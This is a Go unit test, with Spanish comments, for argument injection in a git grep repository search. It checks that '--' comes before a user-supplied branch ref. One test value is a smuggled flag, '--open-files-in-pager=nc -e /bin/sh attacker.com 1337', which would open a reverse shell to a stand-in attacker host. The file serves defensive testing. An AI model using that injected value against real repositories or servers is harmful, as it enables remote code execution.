package v2

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestRepoSearchSecurity(t *testing.T) {
	// Simulador de construcción de argumentos para git grep (versión segura)
	buildGrepArgs := func(query, ref string) []string {
		args := []string{"grep", "-I", "--line-number", "--null", "--max-count", "100"}
		args = append(args, "-e", query, "--", ref)
		return args
	}
	t.Run("Superación: Búsqueda legítima", func(t *testing.T) {
		args := buildGrepArgs("mi_funcion", "main")
		
		// Verificamos que los argumentos son limpios
		assert.Equal(t, "mi_funcion", args[len(args)-3])
		assert.Equal(t, "--", args[len(args)-2])
		assert.Equal(t, "main", args[len(args)-1])
	})

	t.Run("Malintención: Parameter Injection (RCE)", func(t *testing.T) {
		// Atacante inyecta un flag letal en lugar del nombre de la rama
		maliciousRef := "--open-files-in-pager=nc -e /bin/sh attacker.com 1337"
		
		args := buildGrepArgs("texto_seguro", maliciousRef)
		
		isProtected := false
		for i, arg := range args {
			// El mitigador universal es forzar el final de flags usando "--" 
			// antes de variables controladas por el usuario.
			if arg == "--" && i == len(args)-2 {
				isProtected = true
			}
		}
		
		assert.True(t, isProtected, "Se debe forzar el final de argumentos con '--' para evitar inyección de parámetros.")
	})
}
